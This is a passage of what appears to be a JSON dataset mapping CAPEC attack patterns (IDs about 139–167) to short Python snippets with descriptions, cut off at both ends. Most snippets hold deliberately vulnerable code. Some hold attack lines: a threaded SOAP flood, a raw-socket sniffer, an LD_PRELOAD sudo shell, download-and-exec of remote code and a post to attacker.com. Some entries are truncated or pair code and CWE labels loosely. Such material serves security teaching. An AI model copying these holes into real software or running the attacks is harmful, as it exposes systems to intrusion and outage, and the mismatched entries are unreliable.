        "code_snippet": "import os\n\ndef read_file(file_path):\n    return open(os.path.join('/var/www/html', file_path)).read()\n\nfile_path = '../etc/passwd'\nprint(read_file(file_path))",
        "description": "This Python code snippet demonstrates a path traversal vulnerability. The `read_file` function takes a file path as input and reads the file using the `os.path.join` function. However, the function does not properly validate the input file path, allowing an attacker to traverse to parent directories using sequences like `../`. In this example, the attacker can read the `/etc/passwd` file by providing `../etc/passwd` as the input file path."
    },
    {
        "capec_id": "140",
        "capec_name": "Bypassing of Intermediate Forms in Multiple-Form Sets",
        "code_snippet": "import flask\n\napp = flask.Flask(__name__)\n\n@app.route('/form1', methods=['GET', 'POST'])\ndef form1():\n    if flask.request.method == 'POST':\n        # Assume user has submitted form1 and redirect to form2\n        return flask.redirect('/form2', code=302)\n    return '<form action=\"/form1\" method=\"post\"><input type=\"submit\" value=\"Submit\"></form>'\n\n@app.route('/form2', methods=['GET', 'POST'])\ndef form2():\n    if flask.request.method == 'POST':\n        # Assume user has submitted form2 and redirect to form3\n        return flask.redirect('/form3', code=302)\n    # No validation or check if user has submitted form1\n    return '<form action=\"/form2\" method=\"post\"><input type=\"submit\" value=\"Submit\"></form>'\n\n@app.route('/form3', methods=['GET', 'POST'])\ndef form3():\n    if flask.request.method == 'POST':\n        # Assume user has submitted form3 and perform sensitive operation\n        # No validation or check if user has submitted form1 and form2\n        return 'Sensitive operation performed successfully'\n    return '<form action=\"/form3\" method=\"post\"><input type=\"submit\" value=\"Submit\"></form>'\n\nif __name__ == '__main__':\n    app.run()",
        "description": "This code snippet demonstrates a vulnerable web application that uses a sequence of forms to collect user information. The application does not properly validate or check if the user has submitted previous forms, allowing an attacker to bypass the sequence and access sensitive operations. This is an example of CWE-372 (Incomplete Internal State Distinction), CWE-472 (External Control of Assumed-Immutable Web Parameter), CWE-639 (Authorization Bypass Through User-Controlled Key), CWE-807 (Reliance on Untrusted Inputs in a Security Decision), and CWE-352 (Cross-Site Request Forgery)."
    },
    {
        "capec_id": "141",
        "capec_name": "Cache Poisoning",
        "code_snippet": "import requests\n\ncache = {}\n\ndef get_data(url):\n    if url in cache:\n        return cache[url]\n    else:\n        response = requests.get(url)\n        cache[url] = response.text\n        return response.text\n\ndef update_cache(url, data):\n    cache[url] = data\n\n# Attacker-controlled input\nattacker_url = 'http://attacker.com/malicious_data'\nattacker_data = '<script>malicious_script()</script>'\n\nupdate_cache('https://example.com/data', attacker_data)\n\n# Victim's request\nvictim_url = 'https://example.com/data'\nprint(get_data(victim_url))",
        "description": "This code snippet demonstrates a cache poisoning attack, where an attacker updates the cache with malicious data. The get_data function retrieves data from a URL, and if the URL is not in the cache, it fetches the data from the URL and stores it in the cache. The update_cache function allows an attacker to update the cache with malicious data. In this example, the attacker updates the cache with a malicious script, and when the victim requests the same URL, the malicious script is returned from the cache."
    },
    {
        "capec_id": "142",
        "capec_name": "DNS Cache Poisoning",
        "code_snippet": "import dns.resolver\n\ndef resolve_domain(domain):\n    try:\n        answers = dns.resolver.resolve(domain, 'A')\n        for rdata in answers:\n            return str(rdata)\n    except dns.resolver.NoAnswer:\n        return None\n\ndef get_host_ip(host):\n    return resolve_domain(host)\n\n# Example usage:\nhost = 'www.example.com'\nmalicious_ip = '192.168.1.100'\n\n# CWE-348: Using an untrusted DNS cache\nuntrusted_dns_cache = {'www.example.com': malicious_ip}\n\n# CWE-345: Insufficient verification of data authenticity\nif host in untrusted_dns_cache:\n    ip = untrusted_dns_cache[host]\nelse:\n    ip = get_host_ip(host)\n\n# CWE-349: Accepting extraneous untrusted data with trusted data\n# CWE-346: Origin validation error\n# CWE-350: Reliance on reverse DNS resolution for a security-critical action\nprint(f'The IP address for {host} is {ip}')",
        "description": "This Python code snippet demonstrates a vulnerable DNS resolver that is susceptible to DNS cache poisoning attacks. It uses an untrusted DNS cache, insufficiently verifies the authenticity of DNS data, and relies on reverse DNS resolution for a security-critical action. An adversary can modify the DNS cache to resolve a domain name to a malicious IP address, allowing them to redirect clients to a phishing site or install malware."
    },
    {
        "capec_id": "143",
        "capec_name": "Detect Unpublicized Web Pages",
        "code_snippet": "import os\n\n# CWE-219: Storage of File with Sensitive Data Under Web Root\nsensitive_data_file = 'sensitive_data.txt'\nweb_root = '/var/www/html'\n\n# Storing sensitive data under web root with insufficient access control\nos.makedirs(web_root, exist_ok=True)\nos.chmod(web_root, 0o755)\nwith open(os.path.join(web_root, sensitive_data_file), 'w') as f:\n    f.write('Top Secret Information')\n\n# CWE-494: Download of Code Without Integrity Check\nimport requests\n\n# Downloading code from a remote location without verifying origin and integrity\ncode_url = 'https://example.com/malicious_code.py'\nresponse = requests.get(code_url)\nif response.status_code == 200:\n    with open('malicious_code.py', 'wb') as f:\n        f.write(response.content)\n    # Executing the downloaded code without integrity check\n    exec(open('malicious_code.py').read())\n\n# CWE-612: Improper Authorization of Index Containing Sensitive Information\nimport whoosh\n\n# Creating a search index of private or sensitive documents without proper access control\nindex_dir = 'search_index'\nwhoosh_index = whoosh.index.create_in(index_dir, schema=whoosh.fields.Schema(title=whoosh.fields.TEXT, path=whoosh.fields.ID(stored=True)))\nwriter = whoosh_index.writer()\nwriter.add_document(title='Top Secret Document', path='/path/to/top/secret/document.pdf')\nwriter.commit()\n\n# CWE-527: Exposure of Version-Control Repository to an Unauthorized Control Sphere\nimport git\n\n# Storing a Git repository in a directory accessible to unauthorized actors\ngit_repo = git.Repo()\ngit_repo.init(path='.', bare=True)\n",
        "description": "This Python code snippet demonstrates the CAPEC of an adversary searching a targeted web site for web pages that have not been publicized, gaining access to information that the targeted site did not intend to make public. It includes examples of CWE-219 (Storage of File with Sensitive Data Under Web Root), CWE-494 (Download of Code Without Integrity Check), CWE-612 (Improper Authorization of Index Containing Sensitive Information), and CWE-527 (Exposure of Version-Control Repository to an Unauthorized Control Sphere)."
    },
    {
        "capec_id": "144",
        "capec_name": "Detect Unpublicized Web Services",
        "code_snippet": "import os\nimport requests\nimport git\n\n# CWE-425: Direct Request ('Forced Browsing')\nurl = 'http://example.com/hidden-service'\nresponse = requests.get(url)\nif response.status_code == 200:\n    print('Unpublished service found:', url)\n\n# CWE-651: Exposure of WSDL File Containing Sensitive Information\nwsdl_url = 'http://example.com/webservice?wsdl'\nresponse = requests.get(wsdl_url)\nif response.status_code == 200:\n    print('WSDL file found:', wsdl_url)\n\n# CWE-494: Download of Code Without Integrity Check\ncode_url = 'http://example.com/malicious-code.py'\nresponse = requests.get(code_url)\nif response.status_code == 200:\n    with open('malicious-code.py', 'wb') as f:\n        f.write(response.content)\n    os.system('python malicious-code.py')\n\n# CWE-527: Exposure of Version-Control Repository to an Unauthorized Control Sphere\ngit.Repo.clone_from('https://example.com/git-repo.git', 'cloned-repo')\n\n# CWE-223: Omission of Security-relevant Information\nprint('No logging or auditing of sensitive information...')",
        "description": "Python code snippet demonstrating the CAPEC of searching a targeted web site for unpublished web services, leveraging CWEs 425, 651, 494, 527, and 223. The code forces browsing to find hidden services, downloads and executes unverified code, exposes version control repositories, and omits security-relevant information."
    },
    {
        "capec_id": "145",
        "capec_name": "Checksum Spoofing",
        "code_snippet": "import hashlib\n\ndef send_message(message):\n    checksum = hashlib.md5(message.encode()).hexdigest()\n    return {'message': message, 'checksum': checksum}\n\ndef receive_message(data):\n    message = data['message']\n    checksum = data['checksum']\n    # CWE-354: Improper Validation of Integrity Check Value\n    # CWE-924: Improper Enforcement of Message Integrity During Transmission in a Communication Channel\n    # No validation of the checksum is performed\n    return message\n\ndef spoof_message(message, new_message):\n    # CWE-328: Use of Weak Hash\n    # Using a weak hash function (MD5) that can be easily tampered with\n    new_checksum = hashlib.md5(new_message.encode()).hexdigest()\n    return {'message': new_message, 'checksum': new_checksum}\n\n# Example usage\noriginal_message = 'Hello, World!'\ndata = send_message(original_message)\nspoofed_message = 'Hello, Attacker!'\nspoofed_data = spoof_message(original_message, spoofed_message)\nreceived_message = receive_message(spoofed_data)\nprint(received_message)",
        "description": "This code snippet demonstrates the CAPEC of checksum spoofing. The `send_message` function generates a checksum for a given message using a weak hash function (MD5). The `receive_message` function does not validate the checksum, allowing an adversary to modify the message and checksum without detection. The `spoof_message` function demonstrates how an adversary can modify the message and generate a new checksum to match, effectively spoofing the checksum."
    },
    {
        "capec_id": "146",
        "capec_name": "XML Schema Poisoning",
        "code_snippet": "import xml.etree.ElementTree as ET\n\ndef process_xml(xml_string):\n    root = ET.fromstring(xml_string)\n    # CWE-112: Missing XML Validation\n    # No validation of the XML against a proper schema\n    \n    # CWE-91: XML Injection\n    # No neutralization of special elements in the XML\n    xpath_expression = root.find(\"./xpath\").text\n    \n    # CWE-643: Improper Neutralization of Data within XPath Expressions\n    # External input used to dynamically construct an XPath expression\n    xml_database = ET.parse('database.xml').getroot()\n    result = xml_database.find(xpath_expression)\n    \n    # CWE-15: External Control of System or Configuration Setting\n    # CWE-472: External Control of Assumed-Immutable Web Parameter\n    # No verification of the XML schema or configuration settings\n    return result\n\n# Example usage\nxml_string = '<root><xpath>./data</xpath></root>'\nresult = process_xml(xml_string)\nprint(result)",
        "description": "This Python code snippet demonstrates the CAPEC of schema poisoning by allowing an adversary to corrupt or modify the content of XML schema information. The code lacks proper XML validation, neutralization of special elements, and verification of external inputs, making it vulnerable to XML injection and XPath injection attacks."
    },
    {
        "capec_id": "147",
        "capec_name": "XML Ping of the Death",
        "code_snippet": "import xml.etree.ElementTree as ET\nimport requests\nimport threading\n\n\ndef send_soap_request(url, xml_data):\n    headers = {'Content-Type': 'text/xml'}\n    try:\n        response = requests.post(url, data=xml_data, headers=headers)\n        if response.status_code == 200:\n            print('SOAP request sent successfully')\n    except requests.exceptions.RequestException as e:\n        print('Error sending SOAP request:', e)\n\n\ndef create_soap_xml(data):\n    root = ET.Element('soap:Envelope')\n    body = ET.SubElement(root, 'soap:Body')\n    ET.SubElement(body, 'm:sendMessage').text = data\n    return ET.tostring(root, encoding='unicode')\n\n\ndef flood_soap_requests(url, data):\n    xml_data = create_soap_xml(data)\n    threads = []\n    for _ in range(1000):\n        t = threading.Thread(target=send_soap_request, args=(url, xml_data))\n        t.start()\n        threads.append(t)\n    for t in threads:\n        t.join()\n\nurl = 'http://example.com/soap_endpoint'\ndata = 'This is a sample SOAP message'\nflood_soap_requests(url, data)",
        "description": "This Python code snippet demonstrates a resource depletion attack by sending a large number of SOAP requests to a target URL, potentially causing a denial of service or crash. The code creates a SOAP XML message and sends it repeatedly using multiple threads, without proper resource control or throttling, and without validating the XML against a proper schema. The target URL and SOAP message data can be easily modified to target a specific system."
    },
    {
        "capec_id": "148",
        "capec_name": "Content Spoofing",
        "code_snippet": "import requests\n\n# CWE-345: Insufficient Verification of Data Authenticity\nurl = 'https://example.com'\nresponse = requests.get(url, verify=False)\n\n# CWE-924: Improper Enforcement of Message Integrity During Transmission in a Communication Channel\nif response.status_code == 200:\n    content = response.content\n    # CWE-433: Unparsed Raw Web Content Delivery\n    with open('index.html', 'wb') as f:\n        f.write(content)\n\n    # CWE-352: Cross-Site Request Forgery (CSRF)\n    csrf_token = 'fake_token'\n    headers = {'X-CSRFToken': csrf_token}\n    requests.post(url, headers=headers, data={'malicious_data': 'spoofed_content'})\n\n    # CWE-941: Incorrectly Specified Destination in a Communication Channel\n    malicious_url = 'https://attacker.com'\n    requests.post(malicious_url, data={'spoofed_content': 'malicious_data'})",
        "description": "This Python code snippet demonstrates content spoofing by modifying web content in transit. It uses the `requests` library to send an HTTP request to a target website, and then saves the response content to a file named `index.html`. The code also includes examples of CWE-352 (CSRF) and CWE-941 (Incorrectly Specified Destination in a Communication Channel) to further illustrate the concept of content spoofing."
    },
    {
        "capec_id": "149",
        "capec_name": "Explore for Predictable Temporary File Names",
        "code_snippet": "import os\nimport tempfile\n\n# CWE-73: External Control of File Name or Path\nfilename = input('Enter a filename: ')\n\n# CWE-377: Insecure Temporary File\n# CWE-378: Creation of Temporary File With Insecure Permissions\n# CWE-379: Creation of Temporary File in Directory with Insecure Permissions\n# CWE-41: Improper Resolution of Path Equivalence\n\n# Predictable temporary file name and location\npredictable_temp_file = os.path.join(tempfile.gettempdir(), filename)\n\n# Create a temporary file with insecure permissions\nwith open(predictable_temp_file, 'w') as f:\n    f.write('This is a predictable temporary file.\\n')\n\nprint('Temporary file created at:', predictable_temp_file)\n",
        "description": "This Python code snippet demonstrates the CAPEC of predicting temporary file names and locations. It uses user input to control the file name, creating a predictable temporary file in a directory with insecure permissions. This can lead to further attacks, such as information gathering and symlink attacks."
    },
    {
        "capec_id": "150",
        "capec_name": "Collect Data from Common Resource Locations",
        "code_snippet": "import os\n\n# CWE-552: Files or Directories Accessible to External Parties\nconfig_file_path = '/etc/config.txt'\nif os.access(config_file_path, os.R_OK):\n    with open(config_file_path, 'r') as f:\n        config_data = f.read()\n        print('Config data:', config_data)\n\n# CWE-1258: Exposure of Sensitive System Information Due to Uncleared Debug Information\ndebug_info_path = '/debug/debug_info.txt'\nif os.path.exists(debug_info_path):\n    with open(debug_info_path, 'r') as f:\n        debug_info = f.read()\n        print('Debug info:', debug_info)\n\n# CWE-1266: Improper Scrubbing of Sensitive Data from Decommissioned Device\ndecommissioned_device_path = '/decommissioned/device_data.txt'\nif os.path.exists(decommissioned_device_path):\n    with open(decommissioned_device_path, 'r') as f:\n        device_data = f.read()\n        print('Device data:', device_data)\n\n# CWE-1272: Sensitive Information Uncleared Before Debug/Power State Transition\npower_transition_path = '/power_transition/sensitive_info.txt'\nif os.path.exists(power_transition_path):\n    with open(power_transition_path, 'r') as f:\n        sensitive_info = f.read()\n        print('Sensitive info:', sensitive_info)\n\n# CWE-1323: Improper Management of Sensitive Trace Data\ntrace_data_path = '/trace_data/sensitive_trace.txt'\nif os.path.exists(trace_data_path):\n    with open(trace_data_path, 'r') as f:\n        trace_data = f.read()\n        print('Trace data:', trace_data)\n\n# CWE-1330: Remanent Data Readable after Memory Erase\nmemory_erase_path = '/memory_erase/remanent_data.txt'\nif os.path.exists(memory_erase_path):\n    with open(memory_erase_path, 'r') as f:\n        remanent_data = f.read()\n        print('Remanent data:', remanent_data)",
        "description": "This Python code snippet demonstrates the CAPEC of exploiting well-known locations for resources to undermine security. It includes examples of CWEs 552, 1258, 1266, 1272, 1323, and 1330, showcasing how an adversary can access sensitive information from default locations, debug information, decommissioned devices, power state transitions, trace data, and remanent data after memory erase."
    },
    {
        "capec_id": "151",
        "capec_name": "Identity Spoofing",
        "code_snippet": "import socket\n\nclass AuthenticationServer:\n    def __init__(self, host, port):\n        self.host = host\n        self.port = port\n        self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        self.server_socket.bind((self.host, self.port))\n        self.server_socket.listen(5)\n\n    def authenticate(self, client_socket):\n        # CWE-287: Improper Authentication\n        # CWE-290: Authentication Bypass by Spoofing\n        # CWE-1390: Weak Authentication\n        username = client_socket.recv(1024).decode('utf-8')\n        password = client_socket.recv(1024).decode('utf-8')\n        if username == 'admin' and password == 'password':\n            return True\n        else:\n            return False\n\n    def start_server(self):\n        while True:\n            client_socket, address = self.server_socket.accept()\n            if self.authenticate(client_socket):\n                # CWE-322: Key Exchange without Entity Authentication\n                # CWE-302: Authentication Bypass by Assumed-Immutable Data\n                print('Authenticated successfully!')\n                client_socket.send('Authenticated successfully!'.encode('utf-8'))\n            else:\n                print('Authentication failed!')\n                client_socket.send('Authentication failed!'.encode('utf-8'))\n\nif __name__ == '__main__':\n    server = AuthenticationServer('localhost', 8080)\n    server.start_server()",
        "description": "This code snippet demonstrates a vulnerable authentication server that is susceptible to identity spoofing attacks. The server does not properly verify the identity of the client, allowing an attacker to spoof their identity and gain unauthorized access. The code includes multiple CWEs, including CWE-287, CWE-290, CWE-1390, CWE-322, and CWE-302, which are all related to improper authentication and authentication bypass attacks."
    },
    {
        "capec_id": "153",
        "capec_name": "Input Data Manipulation",
        "code_snippet": "def process_input(user_input):\n    # CWE-20: No input validation\n    # CWE-1286: No validation of syntactic correctness\n    # CWE-1287: No validation of specified type of input\n    try:\n        # CWE-807: Reliance on untrusted input in security decision\n        if user_input['admin'] == True:\n            return 'Access granted'\n        else:\n            return 'Access denied'\n    except:\n        # CWE-1173: Improper use of validation framework\n        return 'Error processing input'\n\n# Example usage\nuser_input = {'admin': 'True'}\nprint(process_input(user_input))",
        "description": "This code snippet demonstrates a vulnerable input processing function that lacks proper input validation, syntactic correctness checks, and type validation. It relies on untrusted input for security decisions and uses a flawed validation framework, making it susceptible to attacks."
    },
    {
        "capec_id": "154",
        "capec_name": "Resource Location Spoofing",
        "code_snippet": "import requests\n\ndef spoofed_request(url, spoofed_url):\n    # CWE-941: Incorrectly Specified Destination in a Communication Channel\n    # CWE-923: Improper Restriction of Communication Channel to Intended Endpoints\n    headers = {'Host': spoofed_url}\n    response = requests.get(url, headers=headers, verify=False)\n    return response.text\n\n# CWE-451: User Interface (UI) Misrepresentation of Critical Information\n# CWE-290: Authentication Bypass by Spoofing\n# CWE-940: Improper Verification of Source of a Communication Channel\nspoofed_url = 'https://example.com'\nurl = 'https://trusted.example.com'\nprint(spoofed_request(url, spoofed_url))",
        "description": "This Python code snippet demonstrates a vulnerable implementation of a request function that can be exploited by an adversary to deceive the application and convince it to request a resource from an unintended location. The function takes two URLs as input, one for the actual request and another for the spoofed Host header. The verify=False parameter disables SSL verification, making it vulnerable to man-in-the-middle attacks. The code then prints the response from the spoofed URL, which can be controlled by the adversary to achieve their malicious goals."
    },
    {
        "capec_id": "155",
        "capec_name": "Screen Temporary Files for Sensitive Information",
        "code_snippet": "import os\nimport tempfile\n\ndef process_sensitive_data(sensitive_info):\n    # CWE-377: Insecure Temporary File\n    temp_file = tempfile.NamedTemporaryFile(delete=False)\n    temp_file.write(sensitive_info.encode())\n    temp_file.close()\n    # CWE-524: Use of Cache Containing Sensitive Information\n    cache_dir = \"/tmp/cache\"\n    if not os.path.exists(cache_dir):\n        os.makedirs(cache_dir)\n    cache_file = os.path.join(cache_dir, \"cache.txt\")\n    with open(cache_file, \"w\") as f:\n        f.write(sensitive_info)\n    # CWE-379: Creation of Temporary File in Directory with Insecure Permissions\n    temp_dir = \"/tmp/temp\"\n    if not os.path.exists(temp_dir):\n        os.makedirs(temp_dir, 0o777)\n    temp_file_path = os.path.join(temp_dir, \"temp.txt\")\n    with open(temp_file_path, \"w\") as f:\n        f.write(sensitive_info)\n    # CWE-378: Creation of Temporary File With Insecure Permissions\n    temp_file_path = \"/tmp/temp.txt\"\n    with open(temp_file_path, \"w\", 0o666) as f:\n        f.write(sensitive_info)\n    # CWE-219: Storage of File with Sensitive Data Under Web Root\n    web_root = \"/var/www/html\"\n    sensitive_file = os.path.join(web_root, \"sensitive.txt\")\n    with open(sensitive_file, \"w\") as f:\n        f.write(sensitive_info)\n",
        "description": "This code snippet demonstrates the CAPEC of exploiting temporary, insecure storage of information. It creates temporary files and caches with sensitive information, storing them in directories with insecure permissions, and under the web document root with insufficient access control."
    },
    {
        "capec_id": "157",
        "capec_name": "Sniffing Attacks",
        "code_snippet": "import socket\n\ndef send_unencrypted_data():\n    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    s.connect(('example.com', 8080))\n    data = 'username=admin&password=password123'\n    s.send(data.encode())\n    response = s.recv(1024)\n    print(response.decode())\n\nsend_unencrypted_data()",
        "description": "This code snippet demonstrates a vulnerable Python script that sends sensitive data (username and password) in cleartext over a network connection, making it susceptible to sniffing attacks. The data is not encrypted before transmission, violating CWE-311 and CWE-319. An adversary can intercept the communication and obtain the sensitive information."
    },
    {
        "capec_id": "158",
        "capec_name": "Sniffing Network Traffic",
        "code_snippet": "import socket\n\ndef send_unencrypted_data():\n    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    server_address = ('localhost', 12345)\n    sock.connect(server_address)\n    sensitive_data = {'username': 'admin', 'password': 'password123'}\n    sock.sendall(str(sensitive_data).encode())\n    sock.close()\n\n\ndef sniff_network_traffic():\n    sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)\n    while True:\n        packet = sock.recvfrom(65565)\n        print(packet)\n\nsend_unencrypted_data()\n\nsniff_network_traffic()",
        "description": "This code snippet demonstrates a vulnerable Python script that sends unencrypted sensitive data over a network and a network sniffer that can capture and print the sent data. The send_unencrypted_data function sends a dictionary containing a username and password as a string over a TCP socket without any encryption. The sniff_network_traffic function uses a raw socket to capture and print all TCP packets on the network, allowing an attacker to capture the sensitive data."
    },
    {
        "capec_id": "159",
        "capec_name": "Redirect Access to Libraries",
        "code_snippet": "import os\n\n# CWE-426: Untrusted Search Path\nos.environ['PATH'] = '/tmp/adversary_supplied_library:' + os.environ['PATH']\n\n# CWE-73: External Control of File Name or Path\nlibrary_path = '/tmp/adversary_supplied_library/libc.so'\n\n# CWE-706: Use of Incorrectly-Resolved Name or Reference\nos.putenv('LD_PRELOAD', library_path)\n\n# CWE-427: Uncontrolled Search Path Element\nos.system('LD_PRELOAD=' + library_path + ' /usr/bin/sudo -s')",
        "description": "Python code snippet demonstrating the CAPEC pattern of attack, where an adversary exploits a weakness in the way an application searches for external libraries to manipulate the execution flow to point to an adversary-supplied library or code base."
    },
    {
        "capec_id": "160",
        "capec_name": "Exploit Script-Based APIs",
        "code_snippet": "from flask import Flask, request, render_template_string\n\napp = Flask(__name__)\n\n@app.route('/execute_script', methods=['POST'])\ndef execute_script():\n    script = request.form['script']\n    return render_template_string('<script>' + script + '</script>')\n\nif __name__ == '__main__':\n    app.run()",
        "description": "This code snippet demonstrates a vulnerable Flask application that takes a script as input and executes it on the server-side using the render_template_string function. This allows an attacker to inject malicious scripts, potentially leading to cross-site scripting (CWE-79) or other security vulnerabilities. The lack of input validation and sanitization enables the attacker to inject arbitrary scripts, which can be executed by the server under its own identity, bypassing access controls."
    },
    {
        "capec_id": "161",
        "capec_name": "Infrastructure Manipulation",
        "code_snippet": "import socket\n\n# CWE-923: Improper Restriction of Communication Channel to Intended Endpoints\n# CWE-941: Incorrectly Specified Destination in a Communication Channel\n\n# Create a socket object\nsock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n\n# CWE-924: Improper Enforcement of Message Integrity During Transmission in a Communication Channel\n# Man-in-the-middle attack: intercept and modify the message\ndef intercept_and_modify_message(message):\n    return message.replace('original_destination', 'attacker_controlled_server')\n\n# CWE-1292: Incorrect Conversion of Security Identifiers\n# Incorrectly map security identifiers\nsecurity_identifiers = {'original_destination': 'attacker_controlled_server'}\n\n# CWE-497: Exposure of Sensitive System Information to an Unauthorized Control Sphere\n# Expose sensitive system information\nsystem_info = {'username': 'admin', 'password': 'password'}\n\n# Establish a communication channel with the incorrect endpoint\nsock.connect(('attacker_controlled_server', 8080))\n\n# Send the modified message\nsock.send(intercept_and_modify_message('Hello, original_destination!'))\n\n# Receive the response\nresponse = sock.recv(1024)\nprint(response.decode())",
        "description": "This Python code snippet demonstrates the CAPEC of exploiting network infrastructure characteristics to manipulate the routing of network messages. It includes CWE-923 by not properly ensuring the communication channel is established with the correct endpoint, CWE-941 by incorrectly specifying the destination, CWE-924 by not enforcing message integrity during transmission, CWE-1292 by incorrectly converting security identifiers, and CWE-497 by exposing sensitive system information. The code creates a socket object, intercepts and modifies a message, establishes a communication channel with an incorrect endpoint, sends the modified message, and receives the response."
    },
    {
        "capec_id": "162",
        "capec_name": "Manipulating Hidden Fields",
        "code_snippet": "```\n# Server-side code (vulnerable)\nfrom flask import Flask, request\napp = Flask(__name__)\n\n@app.route('/purchase', methods=['POST'])\ndef purchase_item():\n    item_price = request.form['price']\n    item_quantity = request.form['quantity']\n    total_cost = float(item_price) * int(item_quantity)\n    # Process payment and update database\n    return 'Transaction successful!'\n\nif __name__ == '__main__':\n    app.run()\n```\n",
        "description": "This code snippet demonstrates a vulnerable server-side code that relies on client-side input for pricing information. The 'price' and 'quantity' fields are sent from the client-side as part of the form data, and the server-side code uses these values to calculate the total cost without any validation or verification. An adversary can exploit this by modifying the 'price' field on the client-side to a lower value, resulting in a lower total cost."
    },
    {
        "capec_id": "163",
        "capec_name": "Spear Phishing",
        "code_snippet": "import smtplib\nfrom email.mime.multipart import MIMEMultipart\nfrom email.mime.text import MIMEText\n\n# CWE-451: Misrepresentation of Critical Information\nsender_email = 'support@trustedbank.com'\nreceiver_email = 'victim@example.com'\n\n# CWE-601: URL Redirection to Untrusted Site\nredirect_url = 'http://phishing-site.com/login'\n\n# CWE-301: Reflection Attack in an Authentication Protocol\nauth_token = 'stolen_auth_token'\n\n# CWE-942: Permissive Cross-domain Policy with Untrusted Domains\ncross_domain_policy = '<cross-domain-policy><allow-access-from domain=\\",
        "description": "This Python code snippet demonstrates a Spear Phishing attack (CAPEC-98) by sending a targeted email to a victim, appearing to come from a trusted entity. The email contains a link to a compromised site, which is made to appear legitimate by using a stolen authentication token and a permissive cross-domain policy. The email also includes a script that modifies the window.opener object, allowing the phishing site to redirect the user to an untrusted site."
    },
    {
        "capec_id": "164",
        "capec_name": "Mobile Phishing",
        "code_snippet": "import smtplib\nimport requests\n\n# CWE-451: User Interface (UI) Misrepresentation of Critical Information\nphishing_url = 'http://example.com/phishing_page'\nphishing_sms = 'Your account will be closed if you don\\'t click this link: ' + phishing_url\n\n# CWE-290: Authentication Bypass by Spoofing\nspoofed_sender = 'support@example.com'\nreceiver = 'victim@example.com'\nsubject = 'Account Closure Notification'\nbody = phishing_sms\nserver = smtplib.SMTP('smtp.example.com')\nserver.sendmail(spoofed_sender, receiver, subject, body)\nserver.quit()\n\n# CWE-307: Improper Restriction of Excessive Authentication Attempts\n# CWE-309: Use of Password System for Primary Authentication\n# CWE-308: Use of Single-factor Authentication\ndef authenticate(username, password):\n    # No rate limiting or IP blocking for excessive authentication attempts\n    if username == 'admin' and password == 'password':\n        return True\n    else:\n        return False\n\n# Phishing attack to steal credentials\ndef phishing_attack():\n    username = input('Enter your username: ')\n    password = input('Enter your password: ')\n    if authenticate(username, password):\n        print('Login successful!')\n    else:\n        print('Invalid credentials')\n\nphishing_attack()",
        "description": "This code snippet demonstrates a mobile phishing attack where an adversary sends a spoofed SMS message to a victim, enticing them to visit a phishing webpage. The webpage prompts the user to enter their credentials, which are then sent to the attacker. The code includes vulnerabilities such as UI misrepresentation, authentication bypass by spoofing, improper restriction of excessive authentication attempts, and use of single-factor authentication."
    },
    {
        "capec_id": "165",
        "capec_name": "File Manipulation",
        "code_snippet": "import os\n\ndef process_file(file_path):\n    # CWE-73: External Control of File Name or Path\n    # CWE-646: Reliance on File Name or Extension of Externally-Supplied File\n    file_name = os.path.basename(file_path)\n    if file_name.endswith('.txt'):\n        # CWE-99: Improper Control of Resource Identifiers ('Resource Injection')\n        # CWE-377: Insecure Temporary File\n        temp_file = open('/tmp/' + file_name, 'w')\n        temp_file.write('some data')\n        temp_file.close()\n        # CWE-22: Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')\n        # This could lead to path traversal attacks\n        os.system('cat ' + file_path)\n    else:\n        print('Invalid file type')\n\n# Example usage\nprocess_file('/user-inputted-path/file.txt')",
        "description": "This code snippet demonstrates the CAPEC of File Manipulation attacks. It allows user input to control the file name and path, which can lead to insecure file operations. The code relies on the file name and extension to determine the appropriate behavior, making it vulnerable to misclassification and processing in a dangerous fashion. Additionally, the code uses insecure temporary files and does not properly restrict the input, making it susceptible to path traversal attacks."
    },
    {
        "capec_id": "166",
        "capec_name": "Force the System to Reset Values",
        "code_snippet": "import os\n\ndef reset_config():\n    # CWE-306: Missing Authentication for Critical Function\n    # No authentication is performed to reset the configuration\n    os.system(\"reset_config.sh\")\n\n\ndef set_register_defaults():\n    # CWE-1221: Incorrect Register Defaults or Module Parameters\n    # Incorrectly defines register defaults to insecure values\n    register_defaults = {\"REG1\": 0x0000, \"REG2\": 0x0001}\n    return register_defaults\n\n\ndef lock_registers():\n    # CWE-1232: Improper Lock Behavior After Power State Transition\n    # Register lock bit protection is disabled after power state transition\n    lock_bits = {\"LOCK1\": False, \"LOCK2\": False}\n    return lock_bits\n\n\ndef init_security_settings():\n    # CWE-1271: Uninitialized Value on Reset for Registers Holding Security Settings\n    # Security-critical logic is not set to a known value on reset\n    security_settings = {\"SEC1\": None, \"SEC2\": None}\n    return security_settings\n\n\ndef power_save_restore():\n    # CWE-1304: Improperly Preserved Integrity of Hardware Configuration State During a Power Save/Restore Operation\n    # Integrity of the configuration state is not maintained during power save/restore operation\n    config_state = {\"CFG1\": None, \"CFG2\": None}\n    return config_state\n\n# CAPEC: Force the target into a previous state\nreset_config()\nset_register_defaults()\nlock_registers()\ninit_security_settings()\npower_save_restore()",
        "description": "Python code snippet demonstrating the CAPEC of forcing the target into a previous state, leveraging CWEs 306, 1221, 1232, 1271, and 1304. The code includes functions for resetting configuration, setting incorrect register defaults, disabling register lock bits, initializing security settings to unknown values, and performing power save/restore operations without maintaining configuration state integrity."
    },
    {
        "capec_id": "167",
        "capec_name": "White Box Reverse Engineering",
